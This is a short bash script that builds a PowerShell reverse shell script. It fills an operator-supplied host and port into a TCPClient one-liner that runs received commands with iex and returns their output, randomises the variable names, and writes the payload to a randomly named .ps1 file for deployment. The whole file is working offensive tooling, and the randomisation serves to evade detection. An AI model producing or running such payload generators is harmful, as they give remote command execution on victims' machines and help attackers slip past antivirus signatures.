#!/bin/bash

## Credits:
### powershell reverse shell one-liner by Nikhil SamratAshok Mittal @samratashok
### sample taken from https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

####  Usage: Generates a simple powershell reverse shell script but randomizes the variable names every time.
####  Takes in the LHOST and LPORT as parameters.
####  Create the ps1 files and deploy them as needed.

if [ "$#" -ne 2 ]; then
    echo "Please run the script by passing in the lhost and lport."
    echo "e.g. ./gen_ps1_rev_shell.sh 10.10.10.2 4444"
else
    lhost=$1
    lport=$2
    rando0=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
    file1="$rando0.ps1"
    rando1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
    rando2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
    rando3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
    rando4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
    rando5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
    rando6=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
    rando7=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
    main='$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    mod1="${main//client/$rando1}"
    mod2="${mod1//stream/$rando2}"
    mod3="${mod2//bytes/$rando3}"
    mod4="${mod3//data/$rando4}"
    mod5="${mod4//sendback2/$rando5}"
    mod6="${mod5//sendback/$rando6}"
    mod7="${mod6//sendbyte/$rando7}"
    mod8="${mod7//LHOST/$lhost}"
    mod9="${mod8//LPORT/$lport}"
    echo $mod9 > $file1
    echo "$file1 created!"
fi
